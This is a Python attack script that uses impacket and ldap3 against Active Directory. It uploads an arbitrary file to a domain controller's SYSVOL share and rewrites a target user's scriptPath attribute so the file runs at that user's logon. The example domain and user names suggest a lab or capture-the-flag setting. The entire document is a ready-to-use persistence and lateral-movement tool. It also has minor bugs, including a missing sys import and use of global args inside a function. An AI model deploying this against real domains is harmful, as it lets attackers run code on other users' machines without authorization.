import argparse
from impacket.smbconnection import SMBConnection
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE, NTLM
import os

def upload_script(dc_ip, domain, username, password, target_path, script_file):
    smb = SMBConnection(dc_ip, dc_ip)
    print("[*] Connecting to SMB...")
    smb.login(username, password, domain)

    share_name = "SYSVOL"
    remote_path = target_path.replace("C:\\Windows\\SYSVOL\\sysvol\\", "").replace("\\", "/").rstrip('/')

    with open(script_file, "rb") as f:
        smb.putFile(share_name, f"{remote_path}/{os.path.basename(script_file)}", f.read)
    
    print(f"[+] Uploaded {script_file} to {remote_path}/{os.path.basename(script_file)}")

def set_logon_script(dc_ip, domain, username, password, target_user, script_name):
    user = f"{domain}\\{username}"
    server = Server(dc_ip, get_info=ALL)
    print("[*] Connecting to LDAP...")
    conn = Connection(server, user=user, password=password, authentication=NTLM, auto_bind=True)

    target_user_dn = get_user_dn(conn, args.target_user, args.domain)
    if not target_user_dn:
        print(f"[-] Could not find DN for user: {args.target_user}")
        sys.exit(1)

    # Modify the scriptPath attribute
    conn.modify(target_user_dn, {'scriptPath': [(MODIFY_REPLACE, [script_name])]})

    if conn.result['description'] == 'success':
        print(f"[+] Successfully set scriptPath to '{script_name}' for {target_user_dn}")
    else:
        print(f"[-] Failed to set scriptPath: {conn.result}")

def get_user_dn(conn, target_username, domain):
    base_dn = f"DC={domain.lower()},DC=local"
    search_filter = f"(sAMAccountName={target_username})"
    conn.search(search_base=base_dn, search_filter=search_filter, attributes=["distinguishedName"])
    if conn.entries:
        return str(conn.entries[0].distinguishedName)
    else:
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Upload logon script and set scriptPath attribute")
    parser.add_argument("--dc", required=True, help="Domain Controller IP")
    parser.add_argument("--domain", required=True, help="Domain name (e.g., furious)")
    parser.add_argument("--username", required=True, help="Username")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--script-file", required=True, help="Path to the script file")
    parser.add_argument("--target-path", default="C:\\Windows\\SYSVOL\\sysvol\\furious.local\\scripts\\", help="Full target path to upload script")
    parser.add_argument("--target-user", required=True, help="Target user to assign logon script to (e.g., erhodes)")
    
    args = parser.parse_args()

    upload_script(args.dc, args.domain, args.username, args.password, args.target_path, args.script_file)
    set_logon_script(args.dc, args.domain, args.username, args.password, args.target_user, os.path.basename(args.script_file))
